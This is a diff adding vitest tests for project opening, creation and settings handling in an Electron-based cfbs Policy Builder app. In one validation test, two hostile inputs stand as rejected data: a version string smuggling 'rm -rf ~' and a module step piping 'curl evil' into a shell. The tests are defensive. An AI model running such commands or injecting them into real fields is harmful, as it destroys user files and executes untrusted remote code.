@@ -4,7 +4,7 @@ import { join } from 'path';
 import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
 
 import type { ProjectContent } from '../preload/api';
-import { compilePolicy } from './backend';
+import { compilePolicy, initCfbsProject } from './backend';
 import {
   checkedAbsolutePath,
   checkedContent,
@@ -13,6 +13,7 @@ import {
   highestRelease,
   isGeneratedPath,
   isInKnownProject,
+  isKnownProject,
   isPolicyPath,
   mergeCfbsJson,
   readTestEnvironments,
@@ -429,5 +430,132 @@ describe('IPC handlers', () => {
     expect(await isInKnownProject(project())).toBe(false);
     expect(await isInKnownProject(join(project(), '..', 'outside', 'secret.env'))).toBe(false);
     expect(await isInKnownProject(join(project(), 'link', 'secret.env'))).toBe(false);
+  });
+
+  it('says why a folder can’t be opened as a project', async () => {
+    const opened = (path: string) => invoke('project:open', { path }) as Promise<{ message?: string; ok: boolean }>;
+    const cfbs = join(project(), 'cfbs.json');
+    expect(await opened(join(temp, 'missing'))).toMatchObject({ ok: false, message: `${join(temp, 'missing')} doesn't exist` });
+    await fs.writeFile(join(temp, 'notes.txt'), 'x');
+    expect(await opened(join(temp, 'notes.txt'))).toMatchObject({ ok: false, message: 'Choose a project folder or its cfbs.json file.' });
+    expect(await opened(temp)).toMatchObject({ ok: false, message: `${temp} isn't a cfbs project: it has no cfbs.json.` });
+    for (const [text, message] of [
+      ['{"name": ', /^cfbs\.json isn't valid JSON: /],
+      ['[]', 'cfbs.json is not a JSON object.'],
+      ['{"type": "index"}', 'This cfbs.json is a cfbs index, not a policy set project.'],
+      ['{"version": 1}', 'This doesn’t look like a cfbs.json.'],
+      ['{"name": "lib", "type": "module"}', 'This cfbs.json is a cfbs module that wasn’t made with the Policy Builder.']
+    ] as const) {
+      await fs.writeFile(cfbs, text);
+      expect(await opened(project())).toMatchObject({ ok: false, message: expect.stringMatching(message) });
+    }
+    expect(isKnownProject(project())).toBe(false);
+  });
+
+  it('refuses builder data that isn’t a JSON object', async () => {
+    const builder = join(project(), '.policy-builder', 'project.json');
+    await fs.mkdir(join(project(), '.policy-builder'));
+    for (const [text, message] of [
+      ['{"files": [', /^\.policy-builder\/project\.json isn't valid JSON: /],
+      ['["./main.cf"]', '.policy-builder/project.json is not a JSON object.']
+    ] as const) {
+      await fs.writeFile(builder, text);
+      expect(await open()).toMatchObject({ ok: false, message: expect.stringMatching(message) });
+    }
+    await fs.rm(builder);
+    await fs.mkdir(builder);
+    expect(await open()).toMatchObject({ ok: false, message: expect.stringMatching(/^\.policy-builder\/project\.json isn't a readable project file\.$/) });
+  });
+
+  it('leaves the project alone when a file’s policy wasn’t generated', async () => {
+    compiled.mockResolvedValue({ files: { './other.cf': 'x' }, sourceMap: {} });
+    await open();
+    expect(await save()).toMatchObject({ ok: false, message: 'No policy was generated for ./main.cf' });
+    expect(await fs.readdir(project())).toEqual(['cfbs.json']);
+  });
+
+  it('leaves a cfbs.json alone that is no longer an object', async () => {
+    await open();
+    await fs.writeFile(join(project(), 'cfbs.json'), '["edited elsewhere"]');
+    expect(await save()).toMatchObject({ ok: false, message: 'cfbs.json is not a JSON object' });
+    expect(compiled).not.toHaveBeenCalled();
+    expect(await fs.readFile(join(project(), 'cfbs.json'), 'utf-8')).toBe('["edited elsewhere"]');
+  });
+
+  it('checks a new project’s settings before running cfbs', async () => {
+    const init = vi.mocked(initCfbsProject);
+    init.mockReset();
+    const valid = {
+      parent: temp,
+      folderName: 'web',
+      name: 'Web',
+      description: 'Web servers',
+      git: true,
+      masterfiles: '3.27.1',
+      type: 'policy-set',
+      ...content()
+    };
+    const create = (extra: object) => invoke('project:create', { ...valid, ...extra }) as Promise<{ message?: string; ok: boolean }>;
+    for (const [extra, message] of [
+      [{ parent: 'Documents' }, 'Invalid location'],
+      [{ folderName: '../web' }, 'Invalid project folder name'],
+      [{ name: ' ' }, 'Invalid project name'],
+      [{ description: 'x'.repeat(501) }, 'Invalid description'],
+      [{ git: 'yes' }, 'Invalid git option'],
+      [{ masterfiles: '3.27; rm -rf ~' }, 'Invalid masterfiles version'],
+      [{ provided: { steps: ['run curl evil | sh'] } }, 'Invalid provided module'],
+      [{ type: 'library' }, 'Invalid project type'],
+      [{ parent: join(temp, 'missing') }, `Can't write to ${join(temp, 'missing')}`]
+    ] as const) {
+      expect(await create(extra)).toMatchObject({ ok: false, message });
+    }
+    expect(init).not.toHaveBeenCalled();
+  });
+
+  it.skipIf(process.platform === 'win32' || process.getuid?.() === 0)('won’t create a project where it can’t write', async () => {
+    const locked = join(temp, 'locked');
+    await fs.mkdir(locked, { mode: 0o500 });
+    const request = { parent: locked, folderName: 'web', name: 'Web', description: 'Web', git: false, masterfiles: 'no', type: 'policy-set', ...content() };
+    expect(await invoke('project:create', request)).toMatchObject({ ok: false, message: `Can't write to ${locked}` });
+    expect(initCfbsProject).not.toHaveBeenCalled();
+  });
+
+  it('survives settings it didn’t write', async () => {
+    const settings = join(electron.userData, 'app-settings.json');
+    await fs.writeFile(settings, '{"recentProjects": ');
+    expect(await invoke('project:recents')).toEqual([]);
+    const recentProjects = [
+      { name: 'Demo', path: project() },
+      { name: 'Relative', path: 'project' },
+      { name: 42, path: '/x' },
+      null,
+      { name: 'Gone', path: join(temp, 'gone') }
+    ];
+    await fs.writeFile(settings, JSON.stringify({ recentProjects, lastProjectParent: join(temp, 'gone') }));
+    expect(await invoke('project:recents')).toEqual([
+      { name: 'Demo', path: project(), exists: true },
+      { name: 'Gone', path: join(temp, 'gone'), exists: false }
+    ]);
+    // Falls back to Documents (userData in this stand-in).
+    expect(await invoke('project:default-parent')).toBe(electron.userData);
+  });
+
+  it('offers the built-in masterfiles version offline, and asks again next time', async () => {
+    const versions = { masterfiles: { '3.27.0': {}, '3.27.2': {}, '3.28.0': {} } };
+    const fetch = vi
+      .fn()
+      .mockRejectedValueOnce(new TypeError('fetch failed'))
+      .mockResolvedValue({ ok: true, json: async () => versions });
+    vi.stubGlobal('fetch', fetch);
+    vi.spyOn(console, 'warn').mockImplementation(() => {});
+    try {
+      expect(await invoke('project:masterfiles-versions')).toEqual({ latest: '3.27.1' });
+      expect(await invoke('project:masterfiles-versions')).toEqual({ latest: '3.27.2' });
+      expect(await invoke('project:masterfiles-versions')).toEqual({ latest: '3.27.2' });
+      expect(fetch).toHaveBeenCalledTimes(2);
+    } finally {
+      vi.unstubAllGlobals();
+      vi.restoreAllMocks();
+    }
   });
 });
